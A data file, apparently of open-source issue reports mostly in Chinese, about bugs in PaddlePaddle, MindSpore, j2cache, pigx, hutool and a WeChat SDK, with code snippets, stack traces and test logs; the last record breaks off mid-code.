table.reload 绑定 ajax 返回的 JSON 数据无效，绑定本地 JSON 数据有效,"我写了一段这样的代码，在页面刷新后，能够给表格绑定数据，其中 '../data.json' 是我本地的数据： 然后我修改了一下代码，获取远程数据，控制台成功打印出了获取到的 JSON 数据，但就是绑不上表格： 有人知道是什么原因吗？   <code>: search({}); function search(data) { $.ajax({ url: '../data.json', data: data, dataType: 'json', success: function (res) { table.reload('dataTable', { data: res.data }) } }) } search({}); function search(data) { $.ajax({ url: selectUrl, type:'post', data: data, dataType: 'json', success: function (res) { console.log(res); // 控制台打印出了返回的 JSON 数据 table.reload('dataTable', { data: res }); } }) }"
develop dist train failed,"Run failed with ParallelExecutor need to follow PR: #10656:ctr模型deep wide，使用的demo数据，为什么评估指标没有打印出来呀？   <code>: distribute_transpiler.py Traceback (most recent call last): File ""vgg16_pe_gpu.py"", line 329, in &lt;module&gt; main() File ""vgg16_pe_gpu.py"", line 313, in main train_exe = fluid.ParallelExecutor(use_cuda=use_gpu, main_program=trainer_prog, loss_name=avg_cost.name) File ""/paddle/build/python/paddle/fluid/parallel_executor.py"", line 155, in __init__ build_strategy, num_trainers, trainer_id) paddle.fluid.core.EnforceNotMet: at [/paddle/paddle/fluid/framework/details/multi_devices_graph_builder.cc:232] PaddlePaddle Call Stacks: 0 0x7f3439821cacp paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 572 1 0x7f343a07b036p paddle::framework::details::MultiDevSSAGraphBuilder::IsSparseGradient(std::unordered_map&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, paddle::framework::proto::VarType_Type, std::hash&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::equal_to&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const, paddle::framework::proto::VarType_Type&gt; &gt; &gt; const&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;) const + 566 2 0x7f343a0812eep paddle::framework::details::MultiDevSSAGraphBuilder::Build(paddle::framework::ProgramDesc const&amp;) const + 5214 3 0x7f34398ee52dp paddle::framework::ParallelExecutor::ParallelExecutor(std::vector&lt;boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt;, std::allocator&lt;boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; &gt; &gt; const&amp;, std::unordered_set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::hash&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::equal_to&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; const&amp;, std::unordered_set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::hash&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::equal_to&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; const&amp;, paddle::framework::ProgramDesc const&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, paddle::framework::Scope*, std::vector&lt;paddle::framework::Scope*, std::allocator&lt;paddle::framework::Scope*&gt; &gt; const&amp;, paddle::framework::details::ExecutionStrategy const&amp;, paddle::framework::details::BuildStrategy const&amp;, unsigned long, unsigned long) + 701"
关于reshape的一些问题？,"PaddlePaddle Ubuntu 16.04 Python 3.5 问题 Tensorflow的 Paddlepaddle这样两个是否等效？   <code>: num_cls_prob = tf.size(cls_prob) cls_prob_reshpae = tf.reshape(cls_prob, [num_cls_prob, -1]) label_int = tf.cast(label_filter_invalid, tf.int32) num_cls_prob = sum(cls_prob.shape) cls_prob_reshpae = fluid.layers.reshape(cls_prob, [-1, num_cls_prob]) label_int = fluid.layers.cast(label_filter_invalid, dtype='int32')"
Calculation discrepency exists in gru_unit_op and gru_op,"The calculations for final output are different between gru_unit_op and gru_op: gru_op gru_unit_op   <code>: h_t = dot((1 - u_t), h_{t-1}) + dot(u_t, {h}_t) h_t = dot((1 - u_t), {h}_t) + dot(u_t, h_{t-1})"
一级缓存到期失效时，自动清除二级缓存的逻辑是否有些问题,"你好！ 我使用j2cache 2.5.1版本，测试发现一级缓存到期时，会自动失效二级缓存redis，导致重新查询了数据库，如果只是一级缓存到期失效，这个时候二级缓存并不需要失效。 合理的逻辑，应该是只在对象更新或者删除的时候去失效二级缓存。 如下是清除二级缓存的代码，经过测试只要一级缓存失效，就会触发。 J2CacheBuilder里有如下逻辑 请帮忙确认下是否存在这个问题，谢谢！   <code>: //当一级缓存中的对象失效时，自动清除二级缓存中的数据 Level2Cache level2 = CacheProviderHolder.getLevel2Cache(region); level2.evict(key); if(!level2.supportTTL()) { //再一次清除一级缓存是为了避免缓存失效时再次从 L2 获取到值 CacheProviderHolder.getLevel1Cache(region).evict(key); } log.debug(String.format(""Level 1 cache object expired, evict level 2 cache object [%s,%s]"", region, key)); if(policy != null) policy.sendEvictCmd(region, key);"
【ST】【MS】【OPS】AdaptiveAvgPool2D算子在mindspore 2.0master分支GPU后端用例执行dynamic_shape报错,"AdaptiveAvgPool2D算子在mindspore 2.0master分支GPU后端用例执行dynamic_shape报错 / 硬件环境: /device GPU : -- MindSpore version : mindspore 2.0.0 gpu commit_id = ''[sha1]:cd15cccd,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_ops_adaptiveavgpool2d_func_input_3x5x5_output_size_2x2_fp16 test_ms_ops_adaptiveavgpool2d_func_input_1x64x8x9_output_size_5x7_fp32 test_ms_ops_adaptiveavgpool2d_func_input_1x64x8x9_output_size_5x7_fp64 test_ms_ops_adaptiveavgpool2d_func_input_1x64x8x9_output_size_none_7_fp64 test_ms_ops_adaptiveavgpool2d_func_input_11x26x18x29_output_size_10_none_fp64 test_ms_ops_adaptiveavgpool2d_func_input_126x26x18_output_size_none_none_fp16 test_ms_ops_adaptiveavgpool2d_func_input_256x64x18_output_size_126_fp16 test_ms_ops_adaptiveavgpool2d_func_input_256x64x32x32_output_size_15 test_ms_ops_adaptiveavgpool2d_func_input_3x16x16_output_size_8x8_for_nn test_ms_ops_adaptiveavgpool2d_func_input_3x64x32x32_output_size_12_for_functional export ME_DYNAMIC_SHAPE=1 export DEVICE_TYPE=GPU_PCIE pytest -vra test_ms_ops_adaptiveavgpool2d_func.py 用例执行通过 `================================run with dynamic shape================================ FINFO 2022-10-21 15:28:10 - test_ms_ops_adaptiveavgpool2d_func - test_ms_ops_adaptiveavgpool2d_func.py:teardown:232 - The case teardown is running self.ms_log.step(""Step1: Start operator accuracy compare."") test_ms_ops_adaptiveavgpool2d_func.py:69: ../../../../common/ms_aw/operator/nn/adaptiveavgpool2d_ops.py:104: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../../../../common/ms_aw/operator/nn/adaptiveavgpool2d_ops.py:55: in forward_mindspore_impl out = net(self.input_x) ../../../../common/utils/operator_helper.py:319: in call self.run_dynamic_shape(*args, **kwargs) ../../../../common/utils/operator_helper.py:278: in run_dynamic_shape out_dyn = self.net(*tmp_arg, **kwargs) /home/jenkins0/.conda/envs/gzh/lib/python3.7/site-packages/mindspore/nn/cell.py:639: in call raise err /home/jenkins0/.conda/envs/gzh/lib/python3.7/site-packages/mindspore/nn/cell.py:635: in call output = self._run_construct(args, kwargs) /home/jenkins0/.conda/envs/gzh/lib/python3.7/site-packages/mindspore/nn/cell.py:418: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../../../../common/ms_aw/operator/nn/adaptiveavgpool2d_ops.py:36: in construct return self.adaptiveavgpool2d(input_x) /home/jenkins0/.conda/envs/gzh/lib/python3.7/site-packages/mindspore/ops/primitive.py:305: in call return _run_op(self, self.name, args) /home/jenkins0/.conda/envs/gzh/lib/python3.7/site-packages/mindspore/common/api.py:99: in wrapper results = fn(*arg, **kwargs) /home/jenkins0/.conda/envs/gzh/lib/python3.7/site-packages/mindspore/ops/primitive.py:783: in _run_op output = _pynative_executor.real_run_op(obj, op_name, args) /home/jenkins0/.conda/envs/gzh/lib/python3.7/site-packages/mindspore/common/api.py:798: in real_run_op return self._executor.real_run_op(<em>args) /home/jenkins0/.conda/envs/gzh/lib/python3.7/site-packages/mindspore/ops/primitive.py:617: in infer out[track] = fn(</em>(x[track] for x in args)) /home/jenkins0/.conda/envs/gzh/lib/python3.7/site-packages/mindspore/ops/operations/nn_ops.py:273: in infer_shape validator.check_int(input_x_dimension, 0, Rel.GT, 'input_x dimension', self.name) /home/jenkins0/.conda/envs/gzh/lib/python3.7/site-packages/mindspore/_checkparam.py:241: in check_int return check_number(arg_value, value, rel, int, arg_name, prim_name) arg_value = -1, value = 0, rel = &lt;Rel.GT: 5&gt;, arg_type = &lt;class 'int'&gt; arg_name = ""'input_x dimension'"", prim_name = ""For 'AdaptiveAvgPool2D', the "" E ValueError: For 'AdaptiveAvgPool2D', the 'input_x dimension' must be int and must &gt; 0, but got '-1' with type 'int'.` 梁成辉   <code>: assert fact.forward_cmp() def check_number(arg_value, value, rel, arg_type=int, arg_name=None, prim_name=None): """""" Check argument integer. Usage: - arg_value = check_number(arg_value, 2, Rel.GT, int, ""value"", None) """""" rel_fn = Rel.get_fns(rel) prim_name = f""For \'{prim_name}\', the "" if prim_name else 'The ' arg_name = f""\'{arg_name}\'"" if arg_name else 'input value' prim_info = f'{prim_name}' + f'{arg_name}' if isinstance(arg_value, arg_type): if math.isinf(arg_value) or math.isnan(arg_value) or np.isinf(arg_value) or np.isnan(arg_value): raise ValueError(f""{prim_info} must be a legal value, but got '{arg_value}'."") else: raise TypeError(f""{prim_info} must be {arg_type.__name__}, but got '{type(arg_value).__name__}'"") type_mismatch = not isinstance(arg_value, arg_type) or isinstance(arg_value, bool) type_except = TypeError if type_mismatch else ValueError if type_mismatch or not rel_fn(arg_value, value): rel_str = Rel.get_strs(rel).format(value) raise type_except(f""{prim_info} must be {arg_type.__name__} and must {rel_str}, "" f""but got '{arg_value}' with type '{type(arg_value).__name__}'."")"
控制窗口闪退,"通过无线连接，不是手机，是手机里面装的VMOS，所以我也不清楚USB连过去可以不。 控制窗口闪一下就没了   <code>: server start finish in 0.448s getScreenRect is empty AdbProcess::out:[server] WARN: Max FPS is only supported since Android 10, the option has been ignored Killed"
Add pb_cc_library in generic.cmake,"Fix #2567:Feature/moving error to framework pb_cc_library pb_py_library Description generate a C++ protobuf sources and headers, create a cc_library, add to include dirs generate Python protobuf sources to target directory(default is CMAKE_CURRENT_BINARY_DIR) Example   <code>: pb_cc_library(paddle_proto SRCS ${proto_filenames}) pb_py_library(gen_proto_py SRCS ${proto_filenames} TARGET_DIR ${CMAKE_CURRENT_SOURCE_DIR})"
角色权限分配导致访问菜单404,pigx版本: 3.2.0 是否二开: 是 是否修改包名: 是 问题：权限修改后菜单访问直接跳转404页面。 回显步骤 1、系统设置-角色管理-管理员-点击权限按钮。如图2 2、取消项目管理的权限-点击更新按钮-刷新页面-左侧菜单栏正常不显示项目管理。 3、系统设置-角色管理-管理员-点击权限按钮。 4、勾选项目管理的权限-点击更新按钮-刷新页面-左侧菜单栏正常显示项目管理。 5、点击左侧项目管理菜单按钮-直接跳转404页面。如图1 6、返回的菜单是有项目管理的，如图3 7、刷新页面或清空缓存重新登录显示正常。如图4   <code>: 回显步骤 1、系统设置-角色管理-管理员-点击权限按钮。 2、取消项目管理的权限-点击更新按钮-刷新页面-左侧菜单栏正常不显示项目管理。 3、系统设置-角色管理-管理员-点击权限按钮。 4、勾选项目管理的权限-点击更新按钮-刷新页面-左侧菜单栏正常显示项目管理。 5、点击左侧项目管理菜单按钮-直接跳转404页面
[CT][MS][generate]MaxPool grad not support on Ascend in graph mode,": /device ascend : -- MindSpore version :b691ea45 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : python test_net223.py RuntimeError: mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:808 PrintNotMatchMessage] Can not find any available kernel info for: Default/MaxPoolWithArgmax-op10. Maybe the operator can not supported on Ascend platform. The function call stack: Corresponding code candidate: In file maxpool_grad.py(22)/ out = self.maxpool(input1)/ In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py(376)/ return grad_(fn)(*args)/ In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/_grad/grad_nn_ops.py(250) dx = maxpool_grad(x, out, dout) ^ pass   <code>: from mindspore.common import Parameter from mindspore.common import Tensor from mindspore.common import dtype from mindspore.nn import Cell import mindspore.ops.operations as P from mindspore.ops.composite import GradOperation from mindspore.ops.functional import grad from mindspore import context import mindspore.numpy as np from mindspore.numpy import ones, array #context.set_context(mode=context.PYNATIVE_MODE) #context.set_context(save_graphs=True, save_graphs_path=""./ir"") input1 = ones([7, 9, 10, 2], dtype.float32) class Net(Cell): def __init__(self): super().__init__() self.maxpool = P.MaxPool(kernel_size=(2, 2), strides=2, pad_mode='valid', data_format='NCHW') def construct(self, input1): out = self.maxpool(input1) return out net = Net() grad_net = GradOperation(get_all=True)(net) out = net(input1) print(out.shape) grads1 = grad_net(input1)"
fluid capi multithread issue？,"主进程初始化： 子进程调用： 问题： 请问为什么开了多线程，所有线程还是跑在一个cpu上，是不是需要对每个线程绑定物理核呢？还是有别的问题。   <code>: _place = new paddle::platform::CPUPlace(); _executor = new paddle::framework::Executor(*_place); _scope = new paddle::framework::Scope(); std::cout &lt;&lt; ""pmt start"" &lt;&lt; std::endl; //_inference_program = std::make_unique&lt;paddle::inference::Load&gt;(_executor, *scope, dirname); _inference_program = paddle::inference::Load(_executor, _scope, dirname + ""/"" + ""__model__"", dirname + ""/"" + ""param""); auto copy_program = std::unique_ptr&lt;paddle::framework::ProgramDesc&gt;( new paddle::framework::ProgramDesc(*_inference_program)); std::string feed_holder_name = ""feed_"" + paddle::string::to_string(thread_id); std::string fetch_holder_name = ""fetch_"" + paddle::string::to_string(thread_id); copy_program-&gt;SetFeedHolderName(feed_holder_name); copy_program-&gt;SetFetchHolderName(fetch_holder_name); _executor-&gt;Run(*copy_program, _scope, &amp;feed_targets, &amp;fetch_targets, true, feed_holder_name, fetch_holder_name);"
为什么一个加法操作，耗时需要54秒。,": Uncomment only one line, hit enter to put that in a new line, and remove leading whitespaces from that line: /device gpu 2080ti : -- MindSpore version :1.3.0 -- Python version :3.7.5 -- OS platform and distribution :16.04 -- GCC/Compiler version : 7.3.0 运行下面这行代码，耗时需要54.86秒，显卡是2080ti,是我安装有问题么？   <code>: t_begin = time.time() context.set_context(mode=context.GRAPH_MODE,device_target=""GPU"") x = Tensor(np.ones([1,3,3,4]).astype(np.float32)) y = Tensor(np.ones([1,3,3,4]).astype(np.float32)) print(ops.add(x, y)) print(time.time() - t_begin)"
关于dread的一个小疑问,"例如对于一条StmtNode： dassign %Reg1_I 0 (dread i32 %Reg0_I) 我该如何获取""Reg0_I""这个字符串？ ""Reg1_I""可以通过 得到。 我以为是： 但drNode-&gt;GetStIdx()得到的结果并不正确，不知是否是我的用法有错   <code>: MIRSymbol *sym = func-&gt;GetMirFunc()-&gt;GetLocalOrGlobalSymbol(dNode-&gt;GetStIdx()); std::cout &lt;&lt; sym-&gt;GetName()； DassignNode *dNode = ... if (dNode-&gt;GetRHS()-&gt;GetOpCode() == OP_dread) { DreadNode *drNode = static_cast&lt;DreadNode*&gt;(dNode-&gt;GetRHS()); MIRSymbol *symDread = func-&gt;GetMirFunc()-&gt;GetLocalOrGlobalSymbol(drNode-&gt;GetStIdx()); }"
[ST][MS][NET][resnet50-thor][GPU8p]FPS[2253] can not reach 3100,"resnet50-thor网络在GPU环境8p训练性能11570/fps达不到12500 / 硬件环境: /device gpu : -- MindSpore version :r.18 commit_id:5231ff8e -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_resnet50_thor_imagenet_train_check_loss_gpu_8p.py get code from models sh run_distribute_train_gpu.sh 网络训练成功，性能精度达标 走给王程浩   <code>: epoch time: 62324.201 ms, per step time: 448.376 ms epoch time: 11673.065 ms, per step time: 83.979 ms epoch time: 11727.405 ms, per step time: 84.370 ms epoch time: 11730.258 ms, per step time: 84.390 ms epoch time: 11710.118 ms, per step time: 84.245 ms epoch time: 11771.401 ms, per step time: 84.686 ms epoch time: 11746.923 ms, per step time: 84.510 ms epoch time: 11773.981 ms, per step time: 84.705 ms epoch time: 11745.667 ms, per step time: 84.501 ms epoch time: 11793.880 ms, per step time: 84.848 ms"
通过getMimeType不能获取到rar、7z等类型文件的Content Type,"JDK版本： jdk_8_201 hutool版本： 5.7.22   <code>: String contentType = FileUtil.getMimeType(""a001.rar""); System.out.println(contentType); 返回 null"
Balance storage and computational costs in class Scope,"In class Scope, there are data members: It seems that is necessary to ensure the uniqueness of variable names in a Scope. But could be removed if we add . In this way, we don't need at all.   <code>: private: std::unordered_map&lt;Variable*, std::string&gt; var_to_name_; std::unordered_map&lt;std::string, std::unique_ptr&lt;Variable&gt;&gt; name_to_var_; name_to_var_ var_to_name_ Variable::name Scope::VariableName"
[CT][MS][Adaptiveavgpool3D]grad precision error when output size is is int at gpu,"gpu后端， Adaptiveavgpool3D 算子output_size 取整数时， 反向计算有精度问题 / 硬件环境: /device GPU/ : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph GPU后端执行测试用例 计算结果正确， 对标pass   <code>: def grad_mindspore_impl(self): if self.out_grad_np is None: self.out_grad_np = self.forward_pytorch_impl() net = AdaptiveAvgPool3DtNet(self.output_size) grad_net = GradOfFirstInput(net) grad_net.set_train() input_grad = grad_net(self.input_x, Tensor(self.out_grad_np)) return input_grad.asnumpy() def grad_pytorch_impl(self): if self.torch_support: x = torch.tensor(self.input_x_np, requires_grad=True) grad = torch.from_numpy(self.out_grad_np) else: x = torch.tensor(self.input_x_np.astype(np.float32), requires_grad=True) grad = torch.from_numpy(self.out_grad_np.astype(np.float32)) output_torch = F.adaptive_avg_pool3d(x, self.output_size) output_torch.backward(grad) return x.grad.numpy().astype(self.dtype) def test_adaptiveavgpool3d_5d_float32_output_size_int(): input_x = Tensor(np.random.randn(2, 128, 8, 8, 8).astype(np.float32)) fact = AdaptiveAvgPool3DMock(attributes={""output_size"": 66}, inputs=[input_x]) fact.forward_cmp() &gt; fact.grad_cmp() def test_adaptiveavgpool3d_5d_float32_output_size_int(): input_x = Tensor(np.random.randn(2, 128, 8, 8, 8).astype(np.float32)) fact = AdaptiveAvgPool3DMock(attributes={""output_size"": 66}, inputs=[input_x]) fact.forward_cmp() &gt; fact.grad_cmp() test_adaptiveavgpool3d.py:230: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/adaptiveavgpool3d_ops.py:95: in grad_cmp allclose_nparray(input_grad_mindspore, input_grad_torch, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[[-2.16023529e+02, 4.04524048e+02, 4.26621460e+02, ..., -4.65733276e+02, -4.21394165e+02, -1.987...6387e+02, 1.05351709e+03, ..., -1.21056320e+02, -3.97884766e+02, 7.99583801e+02]]]]], dtype=float32) data_me = array([[[[[-2.16023697e+02, 4.04524261e+02, 4.26621185e+02, ..., -4.65733154e+02, -4.21394440e+02, -1.987...6432e+02, 1.05351807e+03, ..., -1.21056557e+02, -3.97885010e+02, 7.99584900e+02]]]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-0.45365173 -0.16417316 0.334929 -1.3647329 -0.10200989 -0.93070704 E 0.43306714 0.04872805 0.09965831 -0.7595843 -0.1849875 0.38183916 E -1.0860589 -0.4182459 0.351391 0.05150976] E data_me_error:[-0.45345625 -0.16401266 0.33514857 -1.3650401 -0.1016857 -0.93044335 E 0.433236 0.04888937 0.09977457 -0.7597784 -0.1852046 0.38204527 E -1.085835 -0.41849568 0.35104018 0.05137885] E loss:[0.00019547 0.0001605 0.00021958 0.0003072 0.00032419 0.00026369 E 0.00016886 0.00016132 0.00011626 0.00019407 0.0002171 0.00020611 E 0.00022388 0.00024977 0.0003508 0.00013091]"
"2.5前端登陆报错,auth 模块提示序列化异常","pigx版本: 2.5 操作系统:windos 是否修改包名: no   <code>: {""code"":1,""msg"":""Cannot deserialize; nested exception is org.springframework.core.serializer.support.SerializationFailedException: Failed to deserialize payload. Is the byte array a result of corresponding serialization for DefaultDeserializer?; nested exception is java.io.InvalidClassException: org.springframework.security.core.userdetails.User; local class incompatible: stream classdesc serialVersionUID = 500, local class serialVersionUID = 510"",""data"":""unauthorized""}"
mingspore-cpu版不能正常工作,"mingspore-cpu版不能正常工作 mindspore-assistant Hardware Environment(): /device cpu : -- MindSpore version (binary): 1.1.1 -- Python version : 3.7.5 -- OS platform and distribution : Linux Ubuntu 18.04 -- GCC/Compiler version : gcc 7.5.0 在虚拟机vmware workstation 16 player （16.1.0 build-17198959）中，全新安装ubuntu 18.04。 我在4个不同的环境下测试过： 在台式机上的ubuntu，minconda环境中安装。 在笔记本电脑上的windows10，minconda环境中安装。 在上述windows10中的WSL1（windows subsystem for linux 1），minconda环境中安装。 vmware player中全新安装的ubuntu 18.04，minconda环境中安装。 报的错误都一样。这里仅以虚拟机为例，全新安装便于排查问题。 安装 Miniconda3-py38_4.8.3-Linux-x86_64.sh 安装环境 conda create -n ms python=3.7.5 激活环境 conda activate ms 安装mindspore pip install https://ms-release.obs.cn-north-4.myhuaweicloud.com/1.1.1/MindSpore/cpu/ubuntu_x86/mindspore-1.1.1-cp37-cp37m-linux_x86_64.whl --trusted-host ms-release.obs.cn-north-4.myhuaweicloud.com -i https://pypi.tuna.tsinghua.edu.cn/simple <ol start=""6""> 新建以下代码，代码来自官方教程点这里 vi main.py <ol start=""7""> 运行 python main.py 报错如下 应该求出 $x^3$ 在x=2处的二阶导数。 我曾经测试过4个平台，在台式机上安装ubuntu 18.04，在笔记本电脑上的windows10，以及WSL1（windows subsystem for linux 1），以及虚拟机中安装。报的错误都一样。其中台式机是唯一有GPU的，GPU版正常，CPU版报错。即，上述三个平台的mindspore-cpu版本，没有一个能正常运行这个例子。   <code>: import mindspore as ms from mindspore import ops grad_all = ops.composite.GradOperation() def func(x): return x * x * x def df_func(x): return grad_all(func)(x) @ms.ms_function def df2_func(x): return grad_all(df_func)(x) if __name__ == ""__main__"": print(df2_func(ms.Tensor(2, ms.float32))) (ms) gongwei@gongwei-vm:~/PycharmProjects/pythonProject$ python main.py WARNING: 'ControlDepend' is deprecated from version 1.1 and will be removed in a future version, use 'Depend' instead. [WARNING] ME(11107:139643328886592,MainProcess):2021-01-31-13:43:29.447.601 [mindspore/ops/operations/array_ops.py:2302] WARN_DEPRECATED: The usage of Pack is deprecated. Please use Stack. [ERROR] KERNEL(11107,python):2021-01-31-13:43:30.199.010 [mindspore/ccsrc/backend/kernel_compiler/cpu/mkldnn/mkl_cpu_kernel.cc:129] GetDefaultFormatTag] kernel dims invalid 0 [ERROR] SESSION(11107,python):2021-01-31-13:43:30.204.455 [mindspore/ccsrc/backend/session/cpu_session.cc:271] BuildKernel] mindspore/ccsrc/backend/kernel_compiler/cpu/mkldnn/mkl_cpu_kernel.cc:129 GetDefaultFormatTag] kernel dims invalid 0 # Trace: In file /home/gongwei/miniconda3/envs/ms/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/add_impl.py(174)/ return F.addn((x, y))/ In file main.py(27)/ return grad_all(func)(x)/ In file main.py(32)/ return grad_all(df_func)(x)/ Traceback (most recent call last): File ""main.py"", line 36, in &lt;module&gt; print(df2_func(ms.Tensor(2, ms.float32))) File ""/home/gongwei/miniconda3/envs/ms/lib/python3.7/site-packages/mindspore/common/api.py"", line 273, in staging_specialize return _MindSporeFunction(func, input_signature, process_obj)(*args) File ""/home/gongwei/miniconda3/envs/ms/lib/python3.7/site-packages/mindspore/common/api.py"", line 75, in wrapper results = fn(*arg, **kwargs) File ""/home/gongwei/miniconda3/envs/ms/lib/python3.7/site-packages/mindspore/common/api.py"", line 207, in __call__ phase = self.compile(arguments_dict, parse_method) File ""/home/gongwei/miniconda3/envs/ms/lib/python3.7/site-packages/mindspore/common/api.py"", line 182, in compile is_compile = self._executor.compile(self.fn, args_list, phase, True) RuntimeError: mindspore/ccsrc/backend/session/cpu_session.cc:271 BuildKernel] mindspore/ccsrc/backend/kernel_compiler/cpu/mkldnn/mkl_cpu_kernel.cc:129 GetDefaultFormatTag] kernel dims invalid 0 # Trace: In file /home/gongwei/miniconda3/envs/ms/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/add_impl.py(174)/ return F.addn((x, y))/ In file main.py(27)/ return grad_all(func)(x)/ In file main.py(32)/ return grad_all(df_func)(x)/"
[CT][MS][op]  RuntimeError: dictionary changed size during iteration,": /device ascend : -- MindSpore version :ME+VM -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest -s test_gamma.py::test_gamma_input_5d_a_3d_b_2d   <code>: def test_gamma_input_5d_a_3d_b_2d(): fact = GammaFactory(input_shape = (2, 3, 5, 9, 10), alpha = (5, 1, 10), beta = (9, 10), seed=10000) fact.forward_cmp() def test_gamma_input_5d_a_3d_b_2d(): fact = GammaFactory(input_shape = (2, 3, 5, 9, 10), alpha = (5, 1, 10), beta = (9, 10), seed=10000) &gt; fact.forward_cmp() ../operations/test_gamma.py:62: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/gamma_ops.py:54: in forward_cmp set_seed(self.seed) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/seed.py:139: in set_seed _reset_op_seed() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ def _reset_op_seed(): """""" Reset op seeds in the kernel's dictionary. """""" &gt; for kernel_name, op_seed in _KERNEL_SEED.items(): E RuntimeError: dictionary changed size during iteration /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/seed.py:33: RuntimeError"
Token不刷新的问题,"这是你打的补丁. 我觉得 是不是应该放在 initToken 和 initJSToken 里面分别 设置 tokenRefreshing.set(false); 和 jsRefreshing.set(false); 这样才能避免多次刷新造成的无效   <code>: public String getAccessToken() { long now = System.currentTimeMillis(); long time = now - this.weixinTokenStartTime; try { //官方给出的超时时间是7200秒，这里用7100秒来做，防止出现已经过期的情况 if (time &gt; 7100000 &amp;&amp; tokenRefreshing.compareAndSet(false, true)) { LOG.debug(""准备刷新token.............""); initToken(now); } } catch (Exception e) { LOG.warn(""刷新Token出错."", e); } finally { this.tokenRefreshing.set(false); } return accessToken; } private void initToken(final long refreshTime) { LOG.debug(""开始初始化access_token........""); //记住原本的时间，用于出错回滚 final long oldTime = this.weixinTokenStartTime; this.weixinTokenStartTime = refreshTime; String url = ""https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid="" + this.appid + ""&amp;secret="" + this.secret; NetWorkCenter.get(url, 